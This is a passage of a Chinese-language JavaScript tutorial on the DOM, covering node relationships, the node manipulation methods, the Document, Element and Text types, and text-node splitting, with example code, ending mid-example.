<p>除IE8及更早版本之外，这行代码能在任何浏览器中运行。由于IE8及更早版本将NodeList实现为一个COM对象，而我们不能像使用JScript对象那样使用这种对象，因此上面的代码会导致错误。要想在IE中将NodeList转换为数组，必须手动枚举所有成员。下列代码在所有浏览器中都可以运行：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convertToArray</span>(<span class="params">nodes</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        array = <span class="built_in">Array</span>.prototype.slice.call(nodes, <span class="number">0</span>); <span class="comment">//针对非IE浏览器</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ex) &#123;</span><br><span class="line">        array = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>, len=nodes.length; i &lt; len; i++)&#123;</span><br><span class="line">            array.push(nodes[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每个节点都有一个 <code>parentNode</code> 属性，该属性指向文档树中的父节点。包含在childNodes列表中的所有节点都具有相同的父节点，因此它们的parentNode属性都指向同一个节点。此外，包含在childNodes列表中的每个节点相互之间都是同胞节点。通过使用列表中每个节点的 <code>previousSibling</code> 和 <code>nextSibling</code> 属性，可以访问同一列表中的其他节点。列表中第一个节点的previousSibling属性值为null，而列表中最后一个节点的nextSibling属性的值同样也为null。</p>
<p>父节点与其第一个和最后一个子节点之间也存在特殊关系。父节点的 <code>firstChild</code> 和 <code>lastChild</code> 属性分别指向其childNodes列表中的第一个和最后一个节点。其中，someNode.firstChild的值始终等于someNode.childNodes[0]，而someNode.lastChild的值始终等于someNode.childNodes [someNode.childNodes.length-1]。在只有一个子节点的情况下，firstChild和lastChild指向同一个节点。如果没有子节点，那么firstChild和lastChild的值均为null</p>
<p>在反映这些关系的所有属性当中，childNodes属性与其他属性相比更方便一些，因为只须使用简单的关系指针，就可以通过它访问文档树中的任何节点。另外，<code>hasChildNodes()</code> 也是一个非常有用的方法，这个方法在节点包含一或多个子节点的情况下返回true；应该说，这是比查询childNodes列表的length属性更简单的方法。</p>
<p>所有节点都有的最后一个属性是 <code>ownerDocument</code>，该属性指向表示整个文档的<code>文档节点</code>。这种关系表示的是任何节点都属于它所在的文档，任何节点都不能同时存在于两个或更多个文档中。通过这个属性，我们可以不必在节点层次中通过层层回溯到达顶端，而是可以直接访问文档节点。</p>
<h5 id="操作节点"><a class="markdownIt-Anchor" href="#操作节点"></a> <strong>操作节点</strong></h5>
<blockquote>
<p><code>.appendChild()</code>，<code>.insertBefore()</code>，<code>.replaceChild()</code>，<code>.removeChild()</code>；<code>.cloneNode()</code>，<code>.normalize()</code>。</p>
</blockquote>
<p>因为关系指针都是只读的，所以DOM提供了一些操作节点的方法。其中，最常用的方法是 <code>appendChild()</code>，用于向childNodes列表的末尾添加一个节点。添加节点后，childNodes的新增节点、父节点及以前的最后一个子节点的关系指针都会相应地得到更新。更新完成后，appendChild()返回新增的节点。来看下面的例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> returnedNode = someNode.appendChild(newNode);</span><br><span class="line">alert(returnedNode == newNode);         <span class="comment">//true</span></span><br><span class="line">alert(someNode.lastChild == newNode);   <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<p>如果传入到appendChild()中的节点已经是文档的一部分了，那结果就是将该节点从原来的位置转移到新位置。即使可以将DOM树看成是由一系列指针连接起来的，但任何DOM节点也不能同时出现在文档中的多个位置上。因此，如果在调用appendChild()时传入了父节点的第一个子节点，那么该节点就会成为父节点的最后一个子节点，如下面的例子所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//someNode有多个子节点</span></span><br><span class="line"><span class="keyword">var</span> returnedNode = someNode.appendChild(someNode.firstChild);</span><br><span class="line">alert(returnedNode == someNode.firstChild);      <span class="comment">//false</span></span><br><span class="line">alert(returnedNode == someNode.lastChild);       <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<p>如果需要把节点放在childNodes列表中某个特定的位置上，而不是放在末尾，那么可以使用 <code>insertBefore()</code> 方法。这个方法接受两个参数：要插入的节点和作为参照的节点。插入节点后，被插入的节点会变成参照节点的前一个同胞节点（previousSibling），同时被方法返回。如果参照节点是null，则insertBefore()与appendChild()执行相同的操作，如下面的例子所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//插入后成为最后一个子节点</span></span><br><span class="line">returnedNode = someNode.insertBefore(newNode, <span class="literal">null</span>);</span><br><span class="line">alert(newNode == someNode.lastChild);   <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//插入后成为第一个子节点</span></span><br><span class="line"><span class="keyword">var</span> returnedNode = someNode.insertBefore(newNode, someNode.firstChild);</span><br><span class="line">alert(returnedNode == newNode);         <span class="comment">//true</span></span><br><span class="line">alert(newNode == someNode.firstChild);  <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//插入到最后一个子节点前面</span></span><br><span class="line">returnedNode = someNode.insertBefore(newNode, someNode.lastChild);</span><br><span class="line">alert(newNode == someNode.childNodes[someNode.childNodes.length<span class="number">-2</span>]); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<p><code>replaceChild()</code> 方法接受的两个参数是：要插入的节点和要替换的节点。要替换的节点将由这个方法返回并从文档树中被移除，同时由要插入的节点占据其位置。来看下面的例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//替换第一个子节点</span></span><br><span class="line"><span class="keyword">var</span> returnedNode = someNode.replaceChild(newNode, someNode.firstChild);</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换最后一个子节点</span></span><br><span class="line">returnedNode = someNode.replaceChild(newNode, someNode.lastChild);</span><br></pre></td></tr></table></figure>
<p>在使用replaceChild()插入一个节点时，该节点的所有关系指针都会从被它替换的节点复制过来。尽管从技术上讲，被替换的节点仍然还在文档中，但它在文档中已经没有了自己的位置。</p>
<p>如果只想移除而非替换节点，可以使用 <code>removeChild()</code> 方法。这个方法接受一个参数，即要移除的节点。被移除的节点将成为方法的返回值，如下面的例子所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//移除第一个子节点</span></span><br><span class="line"><span class="keyword">var</span> formerFirstChild = someNode.removeChild(someNode.firstChild);</span><br><span class="line"></span><br><span class="line"><span class="comment">//移除最后一个子节点</span></span><br><span class="line"><span class="keyword">var</span> formerLastChild = someNode.removeChild(someNode.lastChild);</span><br></pre></td></tr></table></figure>
<p>上面介绍的四个方法操作的都是某个节点的子节点，也就是说，要使用这几个方法必须先取得父节点（使用parentNode属性）。另外，并不是所有类型的节点都有子节点，如果在不支持子节点的节点上调用了这些方法，将会导致错误发生。</p>
<p>另外还有两个方法是所有类型的节点都有的，<code>cloneNode()</code>与<code>normalize()</code>。cloneNode()用于创建调用这个方法的节点的一个完全相同的副本。cloneNode()方法接受一个布尔值参数，表示是否执行深复制。在参数为true的情况下，执行深复制，也就是复制节点及其整个子节点树；在参数为false的情况下，执行浅复制，即只复制节点本身。复制后返回的节点副本属于文档所有，但并没有为它指定父节点。因此，这个节点副本就成为了一个“孤儿”，除非通过appendChild()、insertBefore()或replaceChild()将它添加到文档中。例如，假设有下面的HTML代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>item 1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>item 2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>item 3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果我们已经将<code>&lt;ul&gt;</code>元素的引用保存在了变量myList中，那么通常下列代码就可以看出使用cloneNode()方法的两种模式：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> deepList = myList.cloneNode(<span class="literal">true</span>);</span><br><span class="line">alert(deepList.childNodes.length);      <span class="comment">//3（IE &lt; 9）或7（其他浏览器）－差异主要是因为IE8及更早版本与其他浏览器处理空白字符的方式不一样。IE9之前的版本不会为空白符创建节点。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shallowList = myList.cloneNode(<span class="literal">false</span>);</span><br><span class="line">alert(shallowList.childNodes.length);   <span class="comment">//0</span></span><br></pre></td></tr></table></figure>
<p>normalize()方法唯一的作用就是处理文档树中的文本节点。由于解析器的实现或DOM操作等原因，可能会出现文本节点不包含文本，或者接连出现两个文本节点的情况。当在某个节点上调用这个方法时，就会在该节点的后代节点中查找上述两种情况。如果找到了空文本节点，则删除它；如果找到相邻的文本节点，则将它们合并为一个文本节点。本章后面还将进一步讨论这个方法。</p>
<hr />
<h4 id="document-类型"><a class="markdownIt-Anchor" href="#document-类型"></a> <code>Document</code> 类型</h4>
<p>JavaScript通过Document类型表示文档。在浏览器中，document对象是HTMLDocument（继承自Document类型）的一个实例，表示整个HTML页面。而且，document对象是window对象的一个属性，因此可以将其作为全局对象来访问。</p>
<p>Document类型可以表示HTML页面或者其他基于XML的文档。不过，最常见的应用还是作为HTMLDocument实例的document对象。通过这个文档对象，不仅可以取得与页面有关的信息，而且还能操作页面的外观及其底层结构。</p>
<h5 id="文档子节点"><a class="markdownIt-Anchor" href="#文档子节点"></a> <strong>文档子节点</strong></h5>
<p>document对象的 documentElement属性始终指向HTML页面中的 <code>&lt;html&gt;</code>元素（文档元素）；</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> html = <span class="built_in">document</span>.documentElement;        <span class="comment">//取得对&lt;html&gt;的引用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//也可以通过childNodes列表访问文档元素，不过效率稍差一点</span></span><br><span class="line"><span class="built_in">console</span>.log(html === <span class="built_in">document</span>.childNodes[<span class="number">0</span>]);     <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(html === <span class="built_in">document</span>.firstChild);        <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<p>作为HTMLDocument的实例，document对象还有一个body属性，直接指向<code>&lt;body&gt;</code>元素。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> body = <span class="built_in">document</span>.body;    <span class="comment">//取得对&lt;body&gt;的引用</span></span><br></pre></td></tr></table></figure>
<p>所有浏览器都支持document.documentElement和document.body属性。</p>
<h5 id="文档信息"><a class="markdownIt-Anchor" href="#文档信息"></a> <strong>文档信息</strong></h5>
<p>作为HTMLDocument的一个实例，document对象还有一些标准的Document对象所没有的属性。这些属性提供了document对象所表现的网页的一些信息。</p>
<ul>
<li><code>title</code> 属性：可写，包含着<code>&lt;title&gt;</code>元素中的文本；修改title属性的值会改变<code>&lt;title&gt;</code>元素内容；</li>
<li><code>URL</code> 属性：只读，包含页面完整的URL（即地址栏中显示的URL）；</li>
<li><code>domain</code> 属性：可写，只包含页面的域名；</li>
<li><code>referrer</code>属性：只读，保存着链接到当前页面的那个页面的URL。</li>
</ul>
<p>后3个属性均与对网页的请求有关，其中只有 <code>domain</code> 属性是可设置的。但由于安全方面的限制，也并非可以给domain设置任何值，如果URL中包含一个子域名，<a href="http://xn--p2p-uc0ep96b.wrox.com" target="_blank" rel="noopener">例如p2p.wrox.com</a>，那么就只能将domain设置为&quot;<a href="http://wrox.com" target="_blank" rel="noopener">wrox.com</a>&quot;。同时览器对domain属性还有一个限制，即如果域名一开始是“松散的”（loose），那么不能将它再设置为“紧绷的”（tight）。换句话说，在将document.domain设置为&quot;<a href="http://wrox.com" target="_blank" rel="noopener">wrox.com</a>&quot;之后，就不能再将其设置回&quot;<a href="http://p2p.wrox.com" target="_blank" rel="noopener">p2p.wrox.com</a>&quot;，否则将会导致错误。</p>
<p>将同一个域名的两个不同的子域名的页面的 <code>domain</code> 属性设置为它们共有的父级域名，可以实现<code>跨域</code>。</p>
<h5 id="查找元素"><a class="markdownIt-Anchor" href="#查找元素"></a> <strong>查找元素</strong></h5>
<p>Document类型提供了两个查找元素的方法：</p>
<ul>
<li><code>getElementById()</code></li>
<li><code>getElementsByTagName()</code>。</li>
</ul>
<p>第三个方法，也是只有 <code>HTMLDocument</code> 类型才有的方法，是 <code>getElementsByName()</code>，最常用于取得单选按钮的情况。</p>
<p><code>getElementsByTagName()</code> 和 <code>getElementsByName()</code> 方法返回一个 HTMLCollection 对象，可以使用方括号语法或item()方法来访问HTMLCollection对象中的项，还支持按名称访问其中的项。另外，该对象还有一个 <code>nameItem()</code> 方法，可通过元素的 name 属性取得集合中的项。<br />
例如，对于以下HTML</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">alt</span>=<span class="string">"picture"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">alt</span>=<span class="string">"picture"</span> <span class="attr">name</span>=<span class="string">"myImg"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">alt</span>=<span class="string">"picture"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> images = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'img'</span>);</span><br><span class="line">alert(images[<span class="number">1</span>] === images.item(<span class="number">1</span>));                  <span class="comment">// true</span></span><br><span class="line">alert(images[<span class="number">1</span>] === images[<span class="string">"myImg"</span>]);                 <span class="comment">// true</span></span><br><span class="line">alert(images[<span class="number">1</span>] === images.nameItem(<span class="string">"myImg"</span>));          <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h5 id="特殊集合"><a class="markdownIt-Anchor" href="#特殊集合"></a> <strong>特殊集合</strong></h5>
<p>除了属性和方法，<code>document</code> 对象还有一些特殊的集合。这些集合都是 HTMLCollection 对象。为访问文档常用的部分提供了快捷方式，包括：</p>
<ul>
<li><code>document.anchors</code>，包含文档中所有带name特性的<code>&lt;a&gt;</code>元素；</li>
<li><code>document.links</code>，包含文档中所有带href特性的<code>&lt;a&gt;</code>元素。</li>
<li><code>document.forms</code>，包含文档中所有的<code>&lt;form&gt;</code>元素，与<code>document.getElementsByTagName(&quot;form&quot;)</code>得到的结果相同；</li>
<li><code>document.images</code>，包含文档中所有的<code>&lt;img&gt;</code>元素，与<code>document.getElementsByTagName(&quot;img&quot;)</code>得到的结果相同；</li>
</ul>
<p>这个特殊集合始终都可以通过HTMLDocument对象访问到，而且，与HTMLCollection对象类似，集合中的项也会随着当前文档内容的更新而更新。</p>
<h5 id="dom一致性检测"><a class="markdownIt-Anchor" href="#dom一致性检测"></a> <strong>DOM一致性检测</strong></h5>
<p>由于DOM分为多个级别，也包含多个部分，因此检测浏览器实现了DOM的哪些部分就十分必要了。<code>document.implementation</code> 属性就是为此提供相应信息和功能的对象，与浏览器对DOM的实现直接对应。DOM1级只为 <code>document.implementation</code> 规定了一个方法，即 <code>hasFeature()</code>。这个方法接受两个参数：要检测的DOM功能的名称及版本号。如果浏览器支持给定名称和版本的功能，则该方法返回true，如下面的例子所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hasXmlDom = <span class="built_in">document</span>.implementation.hasFeature(<span class="string">"XML"</span>, <span class="string">"1.0"</span>);</span><br></pre></td></tr></table></figure>
<h5 id="文档写入"><a class="markdownIt-Anchor" href="#文档写入"></a> <strong>文档写入</strong></h5>
<p>有一个document对象的功能已经存在很多年了，那就是将输出流写入到网页中的能力。这个能力体现在下列4个方法中：</p>
<ul>
<li>write()，接受一个字符串参数，即要写入到输出流中的文本，原样写入；</li>
<li>writeln()，接受一个字符串参数，即要写入到输出流中的文本，写入时会在字符串的末尾添加一个换行符 <code>\n</code>；</li>
<li>open()，打开网页的输出流；</li>
<li>close()，关闭网页的输出流；</li>
</ul>
<h4 id="element-类型"><a class="markdownIt-Anchor" href="#element-类型"></a> <code>Element</code> 类型</h4>
<p>除了Document类型之外，Element类型就要算是Web编程中最常用的类型了。Element类型用于表现XML或HTML元素，提供了对元素标签名、子节点及特性的访问。Element节点具有以下特征：</p>
<ul>
<li>nodeType 的值为1；</li>
<li>nodeName 的值为元素的标签名；</li>
<li>nodeValue 的值为 null；</li>
<li>parentNode 可能是 Document 或 Element；</li>
<li>其子节点可能是Element、Text、Comment、ProcessingInstruction、CDATASection或EntityReference。</li>
</ul>
<p>要访问元素的标签名，可以使用 <code>nodeName</code>属性，也可以使用 <code>tagName</code>属性；这两个属性会返回相同的值（使用后者主要是为了清晰起见）。<br />
在HTML中，标签名始终都以全部<em>大写</em>表示；而在XML（有时候也包括XHTML）中，标签名则始终会与源代码中的保持一致。假如你不确定自己的脚本将会在HTML还是XML文档中执行，最好是在比较之前将标签名转换为相同的大小写形式。如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (element.tagName.toLowerCase() == <span class="string">"div"</span>)&#123; </span><br><span class="line">  <span class="comment">//这样最好（适用于任何文档）    </span></span><br><span class="line">  <span class="comment">//在此执行某些操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="html元素"><a class="markdownIt-Anchor" href="#html元素"></a> <strong>HTML元素</strong></h5>
<p>所有HTML元素都由HTMLElement类型表示，不是直接通过这个类型，也是通过它的子类型来表示。HTMLElement类型直接继承自Element并添加了一些属性。添加的这些属性分别对应于每个HTML元素中都存在的下列标准特性。</p>
<ul>
<li>id，元素在文档中的唯一标识符。</li>
<li>title，有关元素的附加说明信息，一般通过工具提示条显示出来。</li>
<li>lang，元素内容的语言代码，很少使用。</li>
<li>dir，语言的方向，值为&quot;ltr&quot;（left-to-right，从左至右）或&quot;rtl&quot;（right-to-left，从右至左），也很少使用。</li>
<li><code>className</code>，与元素的class特性对应，即为元素指定的CSS类。没有将这个属性命名为class，是因为class是ECMAScript的保留字。</li>
</ul>
<h5 id="取得特性"><a class="markdownIt-Anchor" href="#取得特性"></a> <strong>取得特性</strong></h5>
<p>每个元素都有一或多个特性，这些特性的用途是给出相应元素或其内容的附加信息。操作特性的DOM方法主要有三个：</p>
<ul>
<li>getAttribute(‘attr_name’)</li>
<li>setAttribute(‘attr_name’, ‘attr_value’)</li>
<li>removeAttribute(‘attr_name’)</li>
</ul>
<p>这三个方法可以针对任何特性使用，包括那些以HTMLElement类型属性的形式定义的特性。</p>
<blockquote>
<p>注意，传递给getAttribute()的特性名与实际的特性名相同。因此要想得到class特性值，应该传入&quot;class&quot;而不是&quot;className&quot;，后者只有在通过对象属性访问特性时才用。如果给定名称的特性不存在，getAttribute()返回null。</p>
</blockquote>
<p>特性名不区分大小写。<br />
任何元素的所有特性，也都可以通过DOM元素本身的属性来访问。当然，HTMLElement也会有5个属性与相应的特性一一对应。不过，只有公认的（非自定义的）特性才会以属性的形式添加到DOM对象中。因而操作DOM时，开发人员一般不使用getAttribute()，而是只使用对象的属性。只有在取得自定义特性值的情况下，才会使用getAttribute()方法。</p>
<h5 id="attributes属性"><a class="markdownIt-Anchor" href="#attributes属性"></a> <strong>attributes属性</strong></h5>
<p>Element类型是使用 <code>attributes</code>属性的唯一一个DOM节点类型。<br />
每个特性节点都有一个名为 <code>specified</code> 的属性，这个属性的值如果为true，则意味着要么是在HTML中指定了相应特性，要么是通过setAttribute()方法设置了该特性。</p>
<p><strong>遍历元素的特性</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outputAttributes</span>(<span class="params">element</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> pairs = <span class="keyword">new</span> <span class="built_in">Array</span>(),</span><br><span class="line">      attrName,</span><br><span class="line">      attrValue,</span><br><span class="line">      i,</span><br><span class="line">      len;</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>, len=element.attributes.length; i &lt; len; i++)&#123;</span><br><span class="line">      attrName = element.attributes[i].nodeName;</span><br><span class="line">      attrValue = element.attributes[i].nodeValue;</span><br><span class="line">      <span class="keyword">if</span> (element.attributes[i].specified) &#123;</span><br><span class="line">          pairs.push(attrName + <span class="string">"=\""</span> + attrValue + <span class="string">"\""</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  <span class="keyword">return</span> pairs.join(<span class="string">" "</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="创建元素"><a class="markdownIt-Anchor" href="#创建元素"></a> <strong>创建元素</strong></h5>
<p>使用 <code>document.createElement()</code> 方法可以创建新元素。这个方法只接受一个参数，即要创建元素的标签名。这个标签名在HTML文档中不区分大小写，而在XML（包括XHTML）文档中，则是区分大小写的。</p>
<p>在IE中可以以另一种方式使用createElement()，即为这个方法传入完整的元素标签，也可以包含属性，如下面的例子所示。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">"&lt;div id=\"myNewDiv\" class=\"box\"&gt;&lt;/div &gt;"</span>);</span><br></pre></td></tr></table></figure>
<p>这种方式有助于避开在IE7及更早版本中动态创建元素的某些问题。</p>
<h5 id="元素子节点"><a class="markdownIt-Anchor" href="#元素子节点"></a> <strong>元素子节点</strong></h5>
<p>如果需要通过childNodes属性遍历子节点，通常都要先检查一下nodeTpye属性，如下面的例子所示。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>, len=element.childNodes.length; i &lt; len; i++)&#123;</span><br><span class="line">  <span class="keyword">if</span> (element.childNodes[i].nodeType == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">//执行某些操作</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果想通过某个特定的标签名取得子节点或后代节点该怎么办呢？<br />
实际上，元素也支持 <code>getElementsByTagName()</code> 方法。<br />
在通过元素调用这个方法时，除了搜索起点是当前元素之外，其他方面都跟通过document调用这个方法相同，因此结果只会返回当前元素的后代。例如，要想取得前面 <code>&lt;ul&gt;</code> 元素中包含的所有 <code>&lt;li&gt;</code> 元素，可以使用下列代码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ul = <span class="built_in">document</span>.getElementById(<span class="string">"myList"</span>);</span><br><span class="line"><span class="keyword">var</span> items = ul.getElementsByTagName(<span class="string">"li"</span>);</span><br></pre></td></tr></table></figure>
<hr />
<h4 id="text-类型"><a class="markdownIt-Anchor" href="#text-类型"></a> <code>Text</code> 类型</h4>
<p>文本节点由Text类型表示，包含的是可以照字面解释的纯文本内容。纯文本中可以包含转义后的HTML字符，但不能包含HTML代码。Text节点具有以下特征：</p>
<ul>
<li>nodeType的值为3；</li>
<li>nodeName的值为&quot;#text&quot;；</li>
<li><code>nodeValue</code> 的值为节点所包含的文本；</li>
<li>parentNode是一个Element；</li>
<li>不支持（没有）子节点。</li>
</ul>
<p>可以通过 <code>nodeValue</code> 属性或 <code>data</code> 属性访问 Text 节点中包含的文本，这两个属性中包含的值相同。对 <code>nodeValue</code> 的修改也会通过 <code>data</code> 反映出来，反之亦然。使用下列方法可以操作节点中的文本：</p>
<ul>
<li><code>appendData(text)</code>：将text添加到节点的末尾。</li>
<li><code>deleteData(offset, count)</code>：从offset指定的位置开始删除count个字符。</li>
<li><code>insertData(offset, text)</code>：在offset指定的位置插入text。</li>
<li><code>replaceData(offset, count, text)</code>：用text替换从offset指定的位置开始到offset+ count为止处的文本。</li>
<li><code>splitText(offset)</code>：从offset指定的位置将当前文本节点分成两个文本节点。</li>
<li><code>substringData(offset, count)</code>：提取从offset指定的位置开始到offset+count为止处的字符串。</li>
</ul>
<p>除了这些方法之外，文本节点还有一个 <code>length</code> 属性，保存着节点中字符的数目。而且，<code>nodeValue.length</code> 和 <code>data.length</code> 中也保存着同样的值。<br />
在默认情况下，每个可以包含内容的元素最多只能有一个文本节点，而且必须确实有内容存在。</p>
<p><strong>访问与修改文本子节点</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Hellow World!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> div = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'div'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">var</span> textNode = div.firstChild;  <span class="comment">//取得文本节点</span></span></span><br><span class="line"><span class="actionscript">  div.firstChild.nodeValue = <span class="string">"Some other messages"</span>;   <span class="comment">//修改文本节点</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">  div.firstChild.nodeValue = "Some <span class="tag">&lt;<span class="name">strong</span>&gt;</span>other<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> messages";  //输出结果会是"Some <span class="symbol">&amp;lt;</span>strong<span class="symbol">&amp;gt;</span>other<span class="symbol">&amp;lt;</span>/strong<span class="symbol">&amp;gt;</span> messages"</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>在修改文本节点时还要注意，此时的字符串会经过<strong>HTML（或XML，取决于文档类型）编码</strong>。换句话说，小于号、大于号或引号都会像上面的例子一样被转义。</p>
</blockquote>
<h5 id="创建文本节点"><a class="markdownIt-Anchor" href="#创建文本节点"></a> <strong>创建文本节点</strong></h5>
<p>可以使用 <code>document.createTextNode()</code> 创建新文本节点，这个方法接受一个参数——要插入节点中的文本。与设置已有文本节点的值一样，作为参数的文本也将按照HTML或XML的格式进行编码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> textNode = <span class="built_in">document</span>.createTextNode(<span class="string">"&lt;strong&gt;Hello&lt;/strong&gt; world!"</span>); <span class="comment">//输出结果会是"&amp;lt;strong&amp;gt;Hello&amp;lt;/strong&amp;gt; world!"</span></span><br><span class="line">element.appendChild(textNode);  <span class="comment">//通过 appendChild() 方法，将文本节点添加到元素节点内</span></span><br></pre></td></tr></table></figure>
<h5 id="规范文本节点"><a class="markdownIt-Anchor" href="#规范文本节点"></a> <strong>规范文本节点</strong></h5>
<p>一般情况下，每个元素只有一个文本子节点。不过，在某些情况下也可能包含多个文本子节点。这时一般会用 <code>normalize()</code>方法来规范化。<br />
如果在一个包含两个或多个文本节点的父元素上调用normalize()方法，则会将所有文本节点合并成一个节点，结果节点的nodeValue等于将合并前每个文本节点的nodeValue值拼接起来的值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> element = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">element.className = <span class="string">"message"</span>;</span><br><span class="line"><span class="keyword">var</span> textNode = <span class="built_in">document</span>.createTextNode(<span class="string">"Hello world!"</span>);</span><br><span class="line">element.appendChild(textNode);</span><br><span class="line"><span class="keyword">var</span> anotherTextNode = <span class="built_in">document</span>.createTextNode(<span class="string">"Yippee!"</span>);</span><br><span class="line">element.appendChild(anotherTextNode);<span class="built_in">document</span>.body.appendChild(element);</span><br><span class="line">alert(element.childNodes.length);    <span class="comment">//2</span></span><br><span class="line"></span><br><span class="line">element.normalize();</span><br><span class="line">alert(element.childNodes.length);    <span class="comment">//1</span></span><br><span class="line">alert(element.firstChild.nodeValue);    <span class="comment">// "Hello world!Yippee!"</span></span><br></pre></td></tr></table></figure>
<h5 id="分割文本节点"><a class="markdownIt-Anchor" href="#分割文本节点"></a> <strong>分割文本节点</strong></h5>
<p>Text类型提供了一个作用与normalize()相反的方法：</p>
<ul>
<li><code>splitText()</code></li>
</ul>
<p>这个方法会将一个文本节点分成两个文本节点，即按照指定的位置分割 <code>nodeValue</code> 值。原来的文本节点将包含从开始到指定位置之前的内容，新文本节点将包含剩下的文本。这个方法会返回一个新文本节点，该节点与原节点的 <code>parentNode</code> 相同。来看下面的例子。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> element = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">element.className = <span class="string">"message"</span>;</span><br><span class="line"><span class="keyword">var</span> textNode = <span class="built_in">document</span>.createTextNode(<span class="string">"Hello world!"</span>);</span><br><span class="line">element.appendChild(textNode);<span class="built_in">document</span>.body.appendChild(element);</span><br><span class="line"><span class="keyword">var</span> newNode = element.firstChild.splitText(<span class="number">5</span>);  <span class="comment">//从索引位置“5”(即空格)前切一刀，分成两个文本节点，返回后面的文本节点</span></span><br><span class="line">alert(element.firstChild.nodeValue);    <span 